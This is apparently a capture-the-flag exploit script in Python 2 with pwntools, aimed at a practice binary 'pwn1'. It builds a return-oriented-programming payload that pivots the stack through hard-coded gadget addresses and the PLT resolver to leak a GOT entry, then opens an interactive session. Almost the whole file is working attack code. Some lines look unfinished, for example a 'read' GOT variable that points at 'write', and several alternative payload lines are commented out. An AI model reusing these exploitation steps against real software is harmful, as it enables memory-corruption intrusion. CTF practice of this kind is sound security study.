from pwn import *
import roputils 
context(log_level="debug")
elf = ELF('pwn1')
rop = ROP(elf)

p  = process('./pwn1')
stacksize = 0x800
buffer_addr = elf.bss(0x30)
plt_start_addr = 0x080483a0
leave_ret = 0x08048498
pop_ebp_ret = 0x0804866a
esp = buffer_addr+0x20
write_plt_addr = elf.symbols['write']
write_got_addr  = elf.got["write"]
read_got_addr = elf.got['write']
ppp_ret = 0x08048668
print "buffer = "+hex(buffer_addr)
print "plt_start_addr ="+hex(plt_start_addr)
print "pop_ebp_ret = "+hex(pop_ebp_ret)
print  "leave_ret = "+hex(leave_ret)

gdb.attach(p,'b*0x0804865D\nc')
# payload = str(buffer_addr)+'.'+str(0x20)+'.'+str(plt_start_addr)
payload   = ''
payload += str(leave_ret)+'.'+str(esp)+'.'+str(pop_ebp_ret)+'.'
payload +=(0x30-len(payload))*'A'+4*'A'
# payload +=p32(write_plt_addr)+p32(ppp_ret)+p32(1)+p32(write_got_addr)+p32(4)
# payload +=p32(write_plt_addr)+p32(ppp_ret)
payload +=p32(plt_start_addr)+p32(0x20)+p32(ppp_ret)+p32(1)+p32(read_got_addr)+p32(4)
p.recvuntil('welcome to cctf\n')
p.sendline(payload)
p.interactive()